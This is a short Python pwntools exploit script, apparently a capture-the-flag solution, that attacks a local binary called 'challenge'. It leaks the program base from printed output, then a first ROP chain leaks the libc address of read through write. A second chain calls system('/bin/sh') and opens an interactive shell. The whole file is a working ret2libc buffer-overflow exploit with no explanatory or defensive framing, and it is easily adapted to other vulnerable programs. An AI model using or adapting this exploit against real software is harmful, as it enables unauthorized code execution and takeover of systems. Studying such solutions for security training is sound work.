from pwn import *

elf = ELF("./challenge")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop =  ROP(elf)
rop_libc = ROP(libc)
gs = '''
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
p = start()
p.recvuntil(b"vulnerable = ")
base = int(p.recv(14), 16) - elf.symbols['vulnerable']
log.info(f"[*]{hex(base)}")
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address + base
pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address + base
pop_rdx = rop.find_gadget(['pop rdx', 'ret']).address + base
ret = pop_rdi + 1

stage1 = b"A"*40
stage1 += p64(pop_rdi)
stage1 += p64(1)
stage1 += p64(pop_rsi)
stage1 += p64(elf.got['read'] + base)
stage1 += p64(pop_rdx)
stage1 += p64(8)
stage1 += p64(elf.plt['write'] + base)
stage1 += p64(elf.symbols['vulnerable'] + base)

p.sendafter(b"send your input:\n", stage1)

libc_base = u64(p.recv(8)) - libc.symbols['read']
log.info(f"[*]{hex(libc_base)}")

stage2 = b"A"*40
stage2 += p64(ret)
stage2 += p64(rop.find_gadget(['pop rdi', 'ret']).address + base)
stage2 += p64(next(libc.search(b"/bin/sh\x00")) + libc_base)
stage2 += p64(libc.symbols['system'] + libc_base)
stage2 += p64(rop.find_gadget(['pop rdi', 'ret']).address + base)
stage2 += p64(0)
stage2 += p64(libc.symbols['exit'] + libc_base)

p.sendafter(b"send your input:\n", stage2)


p.interactive()
